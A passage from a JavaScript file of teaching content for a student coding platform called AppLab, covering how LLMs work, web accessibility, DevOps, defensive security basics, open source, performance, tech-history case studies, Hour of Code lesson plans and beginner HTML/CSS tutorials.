      content: 'Tools like ChatGPT, GitHub Copilot, + AppLab\'s Gemini-powered generation all use Large Language Models (LLMs). Understanding how they work is essential for using them well.\n\nAn LLM is a neural network trained on a massive corpus of text + code. The training process: show the model billions of examples, get it to predict the next word/token, adjust the model weights based on errors.\n\nThe result: a model that can predict what code (or text) likely comes next given a context. When you say "write a function that adds two numbers," the model predicts what code typically appears after that prompt in its training data.\n\nThis approach has remarkable strengths:\n- Pattern-matching across millions of examples\n- Knowledge of best practices that appear frequently in training data\n- Familiarity with common libraries + APIs\n- Ability to combine ideas in novel ways\n\nIt also has serious weaknesses:\n- It can confidently produce wrong code (hallucinations)\n- It learns from copyrighted code without permission (legal debate)\n- It struggles with new or rare APIs\n- It can\'t actually execute code to verify it works\n- It can reproduce bugs + security issues from its training data\n\nFor students using AI tools:\n1. AI is a tool, not a substitute for understanding. Code that works without understanding is fragile.\n2. Always read + critique generated code. Spot bugs.\n3. Test generated code thoroughly. Don\'t trust without verification.\n4. Cite + acknowledge AI use in academic work.\n5. Use AI for tedious parts (boilerplate). Do the thinking yourself.\n\nThe AP CSP Big Idea 5 (Impact of Computing) covers this. Students must understand AI\'s benefits + harms.',
      classroomActivities: [
        'Compare AI-generated code to hand-written code. Discuss strengths + weaknesses.',
        'Introduce a deliberately misleading prompt. See what AI generates. Discuss the misleading output.',
        'Compare different AI tools on the same task. Discuss why outputs differ.',
        'Discuss AI training data: should AI be trained on code without permission?',
      ],
    },
    {
      title: 'Web Accessibility: Why Universal Design Matters',
      domain: 'Accessibility + ethics',
      content: 'The web was originally designed to be accessible: Tim Berners-Lee\'s vision was a universal medium for ALL users. In practice, accessibility is often an afterthought.\n\nWho needs accessibility?\n- Blind users (screen readers)\n- Low-vision users (magnification, high contrast)\n- Deaf users (captions)\n- Motor disabilities (keyboard navigation, voice control)\n- Cognitive disabilities (simple language, clear structure)\n- Temporary impairments (broken arm, eyes strained from screen time)\n- Permanent impairments (paralysis, autism, dyslexia)\n- Situational impairments (using phone in bright sun, holding a baby)\n\nWhat does accessibility require?\n- Semantic HTML: <button> not <div onclick>\n- Alt text on images\n- Keyboard navigation throughout\n- Color contrast (4.5:1 minimum)\n- Captions for video\n- Clear, simple language\n- No flashing content (seizures)\n- Form labels properly associated\n\nThe legal landscape:\n- ADA (USA): requires accessibility in public accommodations. Many lawsuits in the past decade.\n- WCAG 2.1 AA: international standard for "accessible." Most major jurisdictions reference it.\n- EU Web Accessibility Directive: requires public-sector sites to be accessible.\n- EAA (European Accessibility Act): expanding accessibility requirements to private sector.\n\nThe business case:\n- 1 in 6 people globally has a disability\n- Accessible sites have BETTER SEO\n- Accessibility benefits everyone (good keyboard nav helps power users; good color contrast helps everyone in bright sun)\n- Lawsuits are expensive\n\nThe ethical case:\n- The web is for everyone. Excluding disabled users isn\'t neutral; it\'s active discrimination.\n- Designers + developers shape who gets to participate online.\n\nIn AppLab:\n- The simulator has built-in accessibility features (color-blind palettes, captions, large-text, reduced-motion)\n- Students are taught to consider accessibility from the start\n- The Tutorials + Project Library include accessibility checklists',
      classroomActivities: [
        'Have students try to use a familiar app keyboard-only. Note pain points.',
        'Audit a real site with WCAG checklist. Identify violations.',
        'Try a screen reader (NVDA, VoiceOver). Try to navigate a site you know.',
        'Discuss: should accessibility be required by law? At what level?',
        'Debate: who should pay for accessibility — companies or government?',
      ],
    },
    {
      title: 'Software Engineering: How Code Becomes Production',
      domain: 'Software engineering practices',
      content: 'Writing code is just one part of being a software engineer. Getting code to production reliably is much more complex.\n\nThe typical software development lifecycle:\n\n1. Idea + planning. Someone identifies a problem. Engineers, designers, product managers discuss + plan a solution.\n\n2. Design. Engineers create technical designs. UX designers create user interface designs. These get reviewed.\n\n3. Build. Engineers write the actual code. They write tests as they go (or before). They submit code via pull requests for review.\n\n4. Code review. Other engineers read + suggest improvements. This catches bugs + improves code quality.\n\n5. Testing. Automated tests run on every commit. Manual testing for usability. Sometimes user research.\n\n6. Staging. Code goes to a staging environment that mimics production. More testing here.\n\n7. Deployment. Code goes live. Sometimes gradually (canary deployment) — a small percentage of users get it first.\n\n8. Monitoring. Logs, metrics, error tracking watch for problems. Engineers get alerts if something breaks.\n\n9. Iteration. Based on real-world usage + feedback, the code improves.\n\nThis is "DevOps" — combining development + operations.\n\nKey concepts:\n- Continuous Integration (CI): every commit is automatically tested.\n- Continuous Deployment (CD): tested code automatically deploys to production.\n- Feature flags: code can ship without being active. Turn features on/off in production.\n- Monitoring: logs + metrics show what\'s happening in real time.\n- Postmortems: when things break, the team writes up what happened + what they\'ll do differently.\n\nWhy this matters for students:\n- Coding is more than writing functions. Most professional time is spent on review, testing, deployment, debugging in production.\n- These are real skills employers want.\n- Even a student\'s personal projects can use these practices (GitHub Actions for CI; Netlify for CD).',
      classroomActivities: [
        'Set up a simple CI pipeline for a student project',
        'Discuss real production incidents (e.g., Github 2018 outage). What went wrong?',
        'Tour a tech company\'s engineering blog. Read a post-mortem.',
        'Discuss feature flagging in detail.',
      ],
    },
    {
      title: 'Cybersecurity: Why Programmers Must Think Like Attackers',
      domain: 'Security',
      content: 'Most software vulnerabilities aren\'t from sophisticated attacks — they\'re from developers not thinking about security at all.\n\nThe OWASP Top 10 lists the most common web vulnerabilities. As of 2023:\n1. Broken Access Control (most prevalent)\n2. Cryptographic Failures\n3. Injection (SQL, command, etc.)\n4. Insecure Design\n5. Security Misconfiguration\n6. Vulnerable + Outdated Components\n7. Identification + Authentication Failures\n8. Software + Data Integrity Failures\n9. Security Logging + Monitoring Failures\n10. Server-Side Request Forgery (SSRF)\n\nLet\'s walk through a real-world breach:\n\nIn 2013, Adobe lost 150 MILLION user passwords in a breach. The reason: Adobe stored passwords with weak encryption + everyone\'s password was encrypted with the same key. After the breach, attackers could decrypt all passwords.\n\nThe fix would have been:\n- Use bcrypt or argon2 (slow + per-user salt)\n- Don\'t store password hints\n- Rate-limit login attempts\n\nDevelopers thought "we have encryption" was enough. It wasn\'t.\n\nThis is the security mindset:\n- Assume your code WILL be attacked\n- Assume your users WILL try to break things\n- Assume data WILL leak\n- Design defensively\n- Defense in depth: multiple layers of security\n\nFor students starting out:\n- Never store plaintext passwords\n- Always validate user input (server-side, not just client-side)\n- Use parameterized queries (no SQL injection)\n- Escape HTML when outputting user content (no XSS)\n- Keep dependencies updated\n- Use HTTPS (TLS) for all production sites\n- Be paranoid about authentication\n\nResources for learning:\n- OWASP Top 10 (free)\n- Web Security Academy (PortSwigger)\n- HackTheBox + CTF challenges\n- Real-world bug bounty programs (HackerOne)',
      classroomActivities: [
        'Build a deliberately vulnerable app. Practice attacking it.',
        'CTF challenges as a class',
        'Audit a real-world site for security issues (responsibly disclose)',
        'Read a real breach post-mortem. Discuss what went wrong.',
      ],
    },
    {
      title: 'Open Source: How Free Software Powers the World',
      domain: 'Open source + ethics',
      content: 'Linux, Apache, MySQL, Python, PHP, React, TensorFlow, Kubernetes, Git, VS Code — these are some of the most important pieces of software in the world. They\'re all open-source.\n\nOpen source means: source code is freely available. Anyone can read, modify, redistribute. There\'s no fee. There\'s no permission to ask.\n\nMost open-source uses one of a few licenses:\n- GPL (GNU Public License): requires that derivative works also be open-source. "Copyleft."\n- MIT License: very permissive. Use, modify, redistribute — commercial use allowed. No copyleft.\n- Apache License: permissive. Includes patent grant.\n- BSD: similar to MIT.\n\nWhy do companies open-source their code?\n- Shared maintenance: many companies contribute to popular tools\n- Recruiting: developers prefer working with open source\n- Standards: making your tool a standard benefits you long-term\n- Ethics: some developers + companies believe in open knowledge\n\nWhy doesn\'t open source replace all software?\n- Profitable proprietary models exist (Adobe, Microsoft Office)\n- Open source needs business models to be sustainable\n- Some software requires expensive infrastructure (data centers)\n- Not all developers want their code open\n\nThe sustainability problem:\nMany open-source maintainers work for free + burn out. The Apache Log4j vulnerability (2021) was discovered + fixed by a small unpaid team. The internet runs on volunteers.\n\nSome solutions emerging:\n- GitHub Sponsors: companies + individuals donate to maintainers\n- Open Collective: legal + financial infrastructure for OSS\n- Tidelift: pays maintainers based on which projects companies depend on\n- Public funding (Germany, France have started funding OSS)\n\nFor students:\n- Use open source freely (most projects are designed to be used)\n- Contribute back when you can (bug reports, docs, small fixes)\n- Consider open-sourcing your own work\n- Understand that "free" software has hidden costs (maintainers\' time)',
      classroomActivities: [
        'Pick an open-source project. Look at its issues + PRs.',
        'Read an OSS license. Understand what it permits + requires.',
        'Open source one of your own projects.',
        'Discuss: should companies be required to fund OSS they use?',
      ],
    },
    {
      title: 'Performance: Why Speed Matters',
      domain: 'Performance + UX',
      content: 'Site speed isn\'t just about user experience. It affects everything: bounce rate, conversion, SEO, accessibility.\n\nGoogle\'s Core Web Vitals (the metrics Google uses for SEO):\n- Largest Contentful Paint (LCP): how fast does the main content render? Target: under 2.5s\n- First Input Delay (FID): how fast does interaction respond? Target: under 100ms\n- Cumulative Layout Shift (CLS): how much does the layout jiggle as it loads? Target: under 0.1\n\nReal-world impact:\n- Amazon found 100ms of latency cost them 1% of sales\n- Google found half-second slowdowns reduced ad revenue 20%\n- Pinterest found 40% faster perceived load time increased traffic 15% + ads 40%\n\nWhy is this so important?\n- Users abandon slow sites — usually within seconds\n- Mobile users are especially impacted (variable connections)\n- Older devices struggle with bloated apps\n- Slow apps are not accessible — users with disabilities can\'t wait\n\nWhere does slowness come from?\n- Too much JavaScript (large bundles take time to download + execute)\n- Many HTTP requests (each round-trip takes time)\n- Large images (often dominant in page weight)\n- Slow APIs (waiting for backend responses)\n- Inefficient algorithms (O(n²) where O(n) would do)\n- Lack of caching (every visit re-downloads everything)\n- Render-blocking resources (JS that blocks page rendering)\n\nKey performance techniques:\n- Lazy loading (load only what\'s needed)\n- Code splitting (don\'t send all JS at once)\n- Image optimization (modern formats, proper sizing)\n- Caching (HTTP caching, service workers)\n- Compression (gzip, brotli)\n- Critical CSS (inline the styles needed for above-the-fold)\n- CDN (servers near the user)\n- Pre-loading (start fetching likely-next resources)\n\nMeasuring performance:\n- Chrome DevTools Performance tab\n- Lighthouse (Chrome built-in audit)\n- WebPageTest (real-world measurement)\n- Real User Monitoring (RUM) in production\n\nFor students:\n- Make speed a design constraint from the start, not an afterthought\n- Measure on real devices, not just your dev laptop\n- Test on slow networks (Chrome DevTools "throttling")\n- Use Lighthouse regularly\n- Don\'t add dependencies casually — each one has performance cost',
      classroomActivities: [
        'Lighthouse audit on your favorite site. Identify worst issues.',
        'Compare app on fast + slow networks.',
        'Optimize a slow app. Measure improvement.',
        'Discuss: what tradeoffs make sites slow? Why does it happen?',
      ],
    },
  ];

  // ─── In-depth case studies (verbose pedagogical content) ─────────
  var CASE_STUDIES = [
    {
      title: 'Case Study: How GitHub Became the Default',
      grade: '9-12',
      domain: 'History of computing',
      summary: 'In 2008, Git existed but no central platform for sharing repos existed. GitHub launched + within 5 years dominated. Today over 100 million developers use it. Understanding this trajectory teaches students about: tool design, network effects, social coding.',
      keyFacts: [
        'Launched April 2008 by Tom Preston-Werner, Chris Wanstrath, P. J. Hyett',
        'Acquired by Microsoft in 2018 for $7.5 billion',
        'Hosts ~400 million repositories as of 2024',
        '100+ million developers use it globally',
        'Switched from "default branch is master" to "default is main" in 2020 (responding to advocacy)',
      ],
      lessons: [
        'Network effects: a tool becomes more valuable as more people use it. Once developers + their employers + their projects are all on GitHub, switching costs are huge.',
        'Open vs proprietary: Git itself is open-source (Linus Torvalds 2005). GitHub is proprietary. The interplay shapes whose dollar pays for the infrastructure.',
        'Inclusive language: "main" vs "master" rename was a small change with big implications about who feels welcome in tech.',
        'Social coding: GitHub turned coding from solitary to social. Reading + reviewing others\' code became normal.',
      ],
      discussionQuestions: [
        'What makes a tool indispensable? Try imagining work without GitHub.',
        'Should there be open alternatives to GitHub? (GitLab + Codeberg exist but smaller.)',
        'What other "default" tools exist in your field? What would happen if they disappeared?',
      ],
      relatedToAppLab: 'AppLab uses GitHub for hosting + version control. Your code lives there if you choose.',
    },
    {
      title: 'Case Study: Stack Overflow + the Q+A Revolution',
      grade: '9-12',
      domain: 'Knowledge sharing',
      summary: 'In 2008, Joel Spolsky + Jeff Atwood launched Stack Overflow to fix the broken state of programming Q+A. Within 5 years it became the dominant resource for developers. By 2024 over 100 million questions answered.',
      keyFacts: [
        'Founded 2008 by Joel Spolsky (Trello founder) + Jeff Atwood (Coding Horror blog)',
        'Joined Stack Exchange network with 170+ Q+A sites',
        'Acquired by Prosus in 2021 for $1.8 billion',
        'Active monthly users: ~100 million',
        'Has been credited with significantly accelerating software development globally',
      ],
      lessons: [
        'Quality through reputation: Stack Overflow\'s upvote/downvote + reputation system made answers self-policing.',
        'Asking good questions is a skill: there\'s a whole community ethos about asking well — title, context, code, error, attempts.',
        'AI tools (ChatGPT, GitHub Copilot) are using Stack Overflow data + are reducing traffic. Stack Overflow is adapting.',
        'Open data movement: SO data is freely available via API + bulk downloads. This is how AI tools learned to answer programming questions.',
      ],
      discussionQuestions: [
        'When was the last time you used a Q+A site? Did you find your answer?',
        'How will AI tools change Q+A? Will Stack Overflow survive?',
        'How could you build a Q+A community for your school or club?',
      ],
      relatedToAppLab: 'When students get stuck, they can post questions on Stack Overflow. The community ethos of asking well applies.',
    },
    {
      title: 'Case Study: The Story of Wikipedia',
      grade: '7-12',
      domain: 'Open knowledge',
      summary: 'In 2001, Jimmy Wales + Larry Sanger launched Wikipedia as an editable online encyclopedia. By 2024 it has 60+ million articles in 300+ languages + is consistently in the world\'s top 10 most-visited sites.',
      keyFacts: [
        'Launched January 15, 2001 by Jimmy Wales + Larry Sanger',
        'Currently has 60+ million articles across all languages',
        'About 6.7 million articles in English (largest)',
        'Edited by ~280,000 active contributors',
        'Funded by Wikimedia Foundation, primarily donations',
        'Used as a source of training data for many AI models',
      ],
      lessons: [
        'Open knowledge can be high quality: studies have shown Wikipedia matches or exceeds traditional encyclopedias.',
        'Distributed coordination works: thousands of unpaid editors produce coherent content.',
        'Bias is a real challenge: most editors are male English-speaking Westerners. Coverage reflects that.',
        'Sustainability is a challenge: Wikipedia needs donations to maintain servers. Most users don\'t donate.',
        'AI relies on Wikipedia: ChatGPT, Google search, AI tools all use Wikipedia as a core source.',
      ],
      discussionQuestions: [
        'How does Wikipedia\'s reliability compare to other sources?',
        'How does Wikipedia stay neutral on controversial topics?',
        'Should AI tools cite Wikipedia? Should they pay for it?',
        'What\'s missing from Wikipedia? What else should be there?',
      ],
      relatedToAppLab: 'AppLab\'s glossary + reference materials are similar to Wikipedia\'s approach — democratized knowledge.',
    },
    {
      title: 'Case Study: How Twitter Changed Real-Time Communication',
      grade: '9-12',
      domain: 'Social platforms',
      summary: 'Twitter (now X) was launched in 2006 + transformed how news, journalism, + politics work. The platform\'s real-time nature, viral spread, + global reach made it unique. Acquired by Elon Musk in 2022.',
      keyFacts: [
        'Founded 2006 by Jack Dorsey, Noah Glass, Biz Stone, Evan Williams',
        'Acquired by Elon Musk in 2022 for $44 billion',
        '~330 million monthly active users (varies)',
        'Used by world leaders, journalists, scientists for real-time updates',
        'Has been blamed for amplifying misinformation + harassment',
        'Has been credited for surfacing important news + voices',
      ],
      lessons: [
        'Viral spread is asymmetric: one user can reach millions. This creates extreme dynamics.',
        'Speed favors information that\'s easy to share — including misinformation.',
        'Free speech vs harm minimization is genuinely hard.',
        'Big platforms have outsized influence on culture + politics.',
        'Single-owner platforms can change dramatically with new ownership.',
      ],
      discussionQuestions: [
        'How does Twitter compare to other communication platforms?',
        'Should social platforms be regulated like utilities?',
        'How do you decide what to believe on social media?',
        'What would a healthier social media look like?',
      ],
      relatedToAppLab: 'Discussing how technology shapes society is core AP CSP material (Big Idea 5).',
    },
    {
      title: 'Case Study: Why React Became Dominant',
      grade: '10-12',
      domain: 'Web development',
      summary: 'In 2013, Facebook open-sourced React, a JavaScript library for building UIs. Within 5 years it dominated front-end development. Today many top sites + apps use React.',
      keyFacts: [
        'Open-sourced by Facebook in 2013',
        'Now maintained by Meta + a large community',
        'Used by Facebook, Instagram, Airbnb, Netflix, Khan Academy, hundreds of thousands of others',
        'Introduced concepts: virtual DOM, declarative UI, component composition',
        'Influenced many other frameworks (Vue, Svelte, Angular)',
      ],
      lessons: [
        'Open-sourcing critical tech can become a competitive advantage (Facebook benefits from improvements made by everyone using React).',
        'Declarative > imperative: "what should be" easier than "how to do it."',
        'Component composition scales: small reusable components combine into complex apps.',
        'Tool dominance is unstable: 10 years from now, something else may dominate.',
        'Learning React is valuable but learning the underlying concepts (state, components, declarative UI) is more valuable.',
      ],
      discussionQuestions: [
        'What problem did React solve? What problems does it create?',
        'When should you use a framework vs vanilla JS?',
        'What\'s the cost of choosing a tool? (Lock-in, learning curve, ecosystem dependence.)',
      ],
      relatedToAppLab: 'AppLab uses React internally. The principles apply to all UI work.',
    },
    {
      title: 'Case Study: The Rise of AI Coding Assistants',
      grade: '10-12',
      domain: 'AI + tools',
      summary: 'GitHub Copilot launched in 2021 as the first AI-powered coding assistant. By 2024, AI coding tools are ubiquitous. The relationship between developers + AI is evolving rapidly.',
      keyFacts: [
        'GitHub Copilot launched June 2021',
        'Cursor, Codeium, Tabnine + many others followed',
        'Powered by large language models trained on code',
        'Generated significant ethical + legal questions (copyright of training data)',
        'Use is widespread among professional developers',
        'AppLab uses Gemini (Google\'s LLM) for similar AI-generation purposes',
      ],
      lessons: [
        'AI can accelerate coding, especially for routine tasks.',
        'AI doesn\'t replace understanding — code that\'s generated AI must be reviewed.',
        'AI can introduce subtle bugs or security issues.',
        'Training data raises ethical + legal issues: who owns the code AI was trained on?',
        'AI changes what skills are valuable: emphasis shifts from typing speed to design + critique.',
      ],
      discussionQuestions: [
        'When should you use AI coding tools? When shouldn\'t you?',
        'How do you cite AI-generated code in school?',
        'What does this mean for entry-level programming jobs?',
        'Is AI making people better programmers or worse?',
      ],
      relatedToAppLab: 'AppLab is built on this premise: AI helps generate code, but humans iterate + improve.',
    },
    {
      title: 'Case Study: Why Open Source Wins Often',
      grade: '10-12',
      domain: 'Open vs proprietary',
      summary: 'Linux (1991), Apache (1995), MySQL (1995), Python (1991), PHP (1995), React (2013), Kubernetes (2014). Open-source software powers most of the internet.',
      keyFacts: [
        '~96% of websites run on open-source server software',
        'Linux runs most of the internet\'s servers + nearly all Android phones',
        'Python is among the most used languages, primarily open-source',
        'PostgreSQL + MySQL are the dominant databases',
        'TensorFlow + PyTorch are dominant in ML',
        'Major companies (Microsoft, Google, Meta) contribute heavily to open source',
      ],
      lessons: [
        'Quality emerges from collaboration: many eyes find more bugs.',
        'Open source creates ecosystems: tools build on tools, accelerating innovation.',
        'Open source has business models: support, consulting, hosting, enterprise versions.',
        'Sustainability is hard: many open-source maintainers burn out or struggle financially.',
        'Ethical concerns: bias in widely-used tools affects millions.',
      ],
      discussionQuestions: [
        'Why would a company give away software?',
        'Who pays for open source if it\'s free?',
        'What open-source project would you contribute to + why?',
        'What\'s the alternative model? When does proprietary make sense?',
      ],
      relatedToAppLab: 'AppLab uses open-source libraries (Three.js, etc.) freely. Your own work could be open-sourced.',
    },
    {
      title: 'Case Study: How Mobile Changed Computing',
      grade: '7-12',
      domain: 'Technology shifts',
      summary: 'In 2007 the iPhone launched. In 2008 Android followed. By 2014, smartphones outsold PCs globally. Today most internet use is mobile-first.',
      keyFacts: [
        '2007: iPhone launches',
        '2008: Android launches',
        '2014: Mobile internet use surpasses desktop',
        '2024: 60%+ of internet traffic is mobile',
        '~4 billion smartphone users globally',
        'Apps + services are now mobile-first by default',
      ],
      lessons: [
        'Major shifts can happen quickly. Mobile went from novelty to dominant in 7 years.',
        'Mobile changed expectations: touch interfaces, location awareness, instant access.',
        'Mobile transformed industries: ride-sharing, food delivery, dating apps, mobile banking.',
        'Mobile also created inequalities: people without smartphones are increasingly excluded.',
        'Mobile-first design is a different paradigm than desktop-first.',
      ],
      discussionQuestions: [
        'What would your life look like without smartphones?',
        'What jobs/industries are entirely mobile?',
        'What\'s the next paradigm shift after mobile?',
        'How should we design for mobile-first?',
      ],
      relatedToAppLab: 'AppLab apps run on mobile via responsive design. Students see this firsthand.',
    },
  ];

  // ─── Hour of Code lesson plans (single-period activities) ─────────
  var HOUR_OF_CODE_LESSONS = [
    {
      title: 'Hour of Code: Build a Personal Webpage',
      grade: 'K-5',
      time: '60 min',
      learning: 'HTML basics. Self-expression through code.',
      hook: '5 min — Show personal webpages of famous people (researchers, artists, athletes). Discuss: what makes a good intro page?',
      activity: '40 min — Each student creates an "About Me" page using AppLab. Required: name, photo (or drawing), 3 hobbies, 1 dream.',
      celebration: '10 min — Students share their pages. Bring snacks.',
      reflection: '5 min — What was the hardest part? What do you want to learn next?',
      materials: 'Computer with AppLab. Maybe a printer for sharing.',
      udlAccommodations: 'Pictures instead of words for early learners. Pair students.',
      followup: 'Add more sections. Add a guestbook. Print + give to family.',
    },
    {
      title: 'Hour of Code: Color My World',
      grade: 'K-5',
      time: '60 min',
      learning: 'CSS color + design. Visual expression.',
      hook: '5 min — Look at favorite color photos. Discuss what colors feel like.',
      activity: '40 min — Students use AppLab to create a colorful greeting card. Different colors. Different fonts. Their personality.',
      celebration: '10 min — Display cards on a class gallery wall.',
      reflection: '5 min — How did colors make you feel? Did you change your design as you went?',
      materials: 'Computer with AppLab.',
      udlAccommodations: 'Pre-designed templates for students who need extra support.',
      followup: 'Print cards for moms/dads/teachers. Send digital cards.',
    },
    {
      title: 'Hour of Code: Animal Mood Tracker',
      grade: '3-5',
      time: '60-90 min',
      learning: 'Buttons, state, simple interactivity.',
      hook: '5 min — Discuss: how do you feel today? Why is it useful to track moods?',
      activity: '60 min — Build a simple mood tracker. 5 emoji buttons (happy, sad, angry, excited, calm). Click → records your mood. Display today\'s moods.',
      celebration: '15 min — Share your tracker. Compare class mood patterns.',
      reflection: '10 min — How could this help you? Could you add more moods?',
      materials: 'Computer with AppLab.',
      udlAccommodations: 'Pre-printed emoji cards. Allow drawing as alternative.',
      followup: 'Add notes per mood. Track over multiple days.',
    },
    {
      title: 'Hour of Code: Magic 8-Ball Predictor',
      grade: '5-8',
      time: '60 min',
      learning: 'Arrays, random selection, simple UI.',
      hook: '5 min — Show the classic Magic 8-Ball toy. Discuss randomness.',
      activity: '40 min — Build a Magic 8-Ball app: type a question, click "Ask", get a random answer.',
      celebration: '10 min — Ask each other silly questions. See what the ball says.',
      reflection: '5 min — Was the randomness fair? Could it ever NOT be random?',
      materials: 'Computer with AppLab.',
      udlAccommodations: 'Pre-written list of answers students can adapt.',
      followup: 'Add custom answer categories. Add sound effects. Build for a specific theme (school, sports).',
    },
    {
      title: 'Hour of Code: Word of the Day',
      grade: '5-8',
      time: '60-90 min',
      learning: 'Arrays, picking based on date, simple data lookup.',
      hook: '5 min — Show 3 unusual words. Discuss: how do you learn new vocabulary?',
      activity: '60 min — Build an app that displays a "word of the day" with its definition. Based on day-of-year (so it changes daily).',
      celebration: '15 min — Show off your apps. Vote on which word is best.',
      reflection: '10 min — How could you add more words? Could you let users contribute?',
      materials: 'Computer with AppLab. Optional dictionary/thesaurus.',
      udlAccommodations: 'Pre-curated word list. Allow voice input for definitions.',
      followup: 'Track which words you\'ve learned. Add example sentences.',
    },
    {
      title: 'Hour of Code: Quiz Builder',
      grade: '6-10',
      time: '60-90 min',
      learning: 'Arrays of objects, forms, conditionals, scoring.',
      hook: '5 min — Show a quiz format you\'re studying for. Discuss: what makes a good quiz question?',
      activity: '60 min — Build a quiz app. Ask 3 questions. Show score at end. Add fact at end of each question.',
      celebration: '15 min — Take each other\'s quizzes. Compare scores.',
      reflection: '10 min — What made some questions harder? What did the AI help with?',
      materials: 'Computer with AppLab.',
      udlAccommodations: 'Pre-written question templates. Audio for English learners.',
      followup: 'Add categories. Save quizzes. Add multiplayer.',
    },
    {
      title: 'Hour of Code: Pixel Art Maker',
      grade: '6-10',
      time: '60-90 min',
      learning: 'Canvas, mouse events, color picking.',
      hook: '5 min — Show classic pixel art. Discuss the simplicity + power of grid-based design.',
      activity: '60 min — Build a pixel art maker: 8x8 or 16x16 grid. Click to color cells. Save your art.',
      celebration: '15 min — Display class pixel art on screen. Vote on favorites.',
      reflection: '10 min — How is this like programming? How is it different?',
      materials: 'Computer with AppLab.',
      udlAccommodations: 'Pre-designed grid templates. Drawing alternative for very young students.',
      followup: 'Larger grids. Add color picker. Export as image.',
    },
    {
      title: 'Hour of Code: Weather App',
      grade: '7-10',
      time: '60-90 min',
      learning: 'API integration, JSON, fetching data.',
      hook: '5 min — Show today\'s weather forecast. Discuss: where does that info come from?',
      activity: '60 min — Build a weather app: enter city, get temperature + conditions. Use Open-Meteo (free, no signup) or similar.',
      celebration: '15 min — Show apps. Discuss which APIs would be useful.',
      reflection: '10 min — What makes APIs powerful? What are their limits?',
      materials: 'Computer with AppLab. Internet connection.',
      udlAccommodations: 'Pre-tested API endpoints. Sample code provided.',
      followup: 'Add 5-day forecast. Add multiple cities. Add geolocation.',
    },
    {
      title: 'Hour of Code: Storytelling App',
      grade: 'K-5 + ESL/ELL',
      time: '60 min',
      learning: 'HTML, text styling, narrative structure.',
      hook: '5 min — Tell a short story. Discuss: how is digital storytelling different?',
      activity: '40 min — Each student writes + displays a 5-page story using AppLab. Each page is a section.',
      celebration: '15 min — Tour the gallery. Listen to each other\'s stories.',
      reflection: '5 min — How is creating + sharing your own story different from reading someone else\'s?',
      materials: 'Computer with AppLab.',
      udlAccommodations: 'Allow images instead of text. Voice recording. Native language with translation.',
      followup: 'Add navigation between pages. Add audio narration. Print + share.',
    },
    {
      title: 'Hour of Code: Local Map App',
      grade: '6-10',
      time: '90 min',
      learning: 'Working with map APIs, coordinates, geographic data.',
      hook: '5 min — Show Google Maps. Discuss: how does it know where everything is?',
      activity: '60-75 min — Use a simple map library (Leaflet.js) to make a map of your neighborhood. Add markers for places that matter to you (home, school, favorite restaurant).',
      celebration: '15 min — Tour each other\'s maps.',
      reflection: '10 min — Could this help newcomers to your area? Could you add walking directions?',
      materials: 'Computer with AppLab. Internet.',
      udlAccommodations: 'Pre-defined map of your school region. Audio descriptions for markers.',
      followup: 'Add photos to markers. Save user-added markers.',
    },
  ];

  // ─── Step-by-step coding tutorials ─────────────────────────────
  // Each tutorial walks through building a real app from scratch.
  var TUTORIALS = [
    {
      id: 'tut_first_webpage',
      title: 'Tutorial 1: Your First Webpage',
      difficulty: 'Absolute beginner',
      duration: '15-30 min',
      prereq: 'None',
      learn: 'How to create an HTML file. Basic HTML structure. Headings, paragraphs, links.',
      steps: [
        {
          step: 1,
          instruction: 'Open a text editor (Notepad, TextEdit, VS Code, or any). Create a new file. Save it as "index.html". The .html extension is essential.',
          code: '',
          why: 'HTML files have .html extension so browsers know how to read them. The filename "index" is a convention — it\'s the default file a server looks for.',
        },
        {
          step: 2,
          instruction: 'Type the basic HTML structure:',
          code: '<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <title>My First Page</title>\n</head>\n<body>\n  <h1>Hello, World!</h1>\n  <p>This is my first webpage.</p>\n</body>\n</html>',
          why: 'DOCTYPE tells browser this is HTML5. lang="en" helps screen readers. charset="UTF-8" enables special characters. <head> contains metadata; <body> contains visible content.',
        },
        {
          step: 3,
          instruction: 'Save the file. Open it in your web browser (Chrome, Firefox, Safari). You should see "Hello, World!" displayed.',
          code: '',
          why: 'Double-clicking an HTML file (or dragging it into a browser) opens it. Browsers know how to render HTML files.',
        },
        {
          step: 4,
          instruction: 'Add a link. Inside <body>, add:',
          code: '<a href="https://wikipedia.org">Visit Wikipedia</a>',
          why: '<a> creates a hyperlink. href is where it goes. The text between <a> and </a> is what user clicks.',
        },
        {
          step: 5,
          instruction: 'Add an image. Use a free image URL:',
          code: '<img src="https://placeholder.com/300x200" alt="Placeholder image">',
          why: '<img> embeds an image. src is the URL. alt is the description for accessibility — required for screen readers.',
        },
        {
          step: 6,
          instruction: 'Refresh the browser (F5). See your link + image. Click the link.',
          code: '',
          why: 'Browser re-reads the file each refresh. Links + interactivity work immediately.',
        },
      ],
      reflection: 'What did you create? You made a real webpage that\'s accessible via any browser. That\'s the foundation of the entire web.',
      nextSteps: 'Try changing the heading text. Add more paragraphs. Add multiple images.',
    },
    {
      id: 'tut_style_with_css',
      title: 'Tutorial 2: Style with CSS',
      difficulty: 'Beginner',
      duration: '30-45 min',
      prereq: 'Tutorial 1 complete',
      learn: 'How to add CSS. Selectors. Colors, fonts, layout basics.',
      steps: [
        {
          step: 1,
          instruction: 'Open index.html. Add a <style> tag inside <head>:',
          code: '<style>\n  body {\n    background: lightblue;\n    color: navy;\n  }\n  h1 {\n    color: white;\n    background: navy;\n    padding: 20px;\n    text-align: center;\n  }\n</style>',
          why: 'CSS inside <style> applies to this page. body selector affects entire page. h1 selector affects all h1 elements.',
        },
        {
          step: 2,
          instruction: 'Refresh. See the styling apply.',
          code: '',
          why: 'CSS describes how HTML should look. Without CSS, pages look plain. With CSS, you have visual design.',
        },
        {
          step: 3,
          instruction: 'Add classes to your elements:',
          code: '<p class="intro">This is my first webpage.</p>\n<p class="note">By me!</p>\n\n<!-- And in CSS: -->\n<style>\n  .intro { font-style: italic; color: navy; }\n  .note { font-size: 12px; color: gray; }\n</style>',
          why: 'Classes let you style specific elements differently. Useful for creating reusable styles.',
        },
        {
          step: 4,
          instruction: 'Try a layout. Add this:',
          code: '<style>\n  .card {\n    background: white;\n    padding: 20px;\n    margin: 20px;\n    border-radius: 8px;\n    box-shadow: 0 2px 8px rgba(0,0,0,0.1);\n  }\n</style>\n\n<div class="card">\n  <h2>Card Title</h2>\n  <p>Card content here.</p>\n</div>',
          why: '<div> is a generic container. With CSS, you can make it look like anything — a card, a sidebar, a modal.',
        },
        {
          step: 5,
          instruction: 'Add flexbox. Wrap multiple cards:',
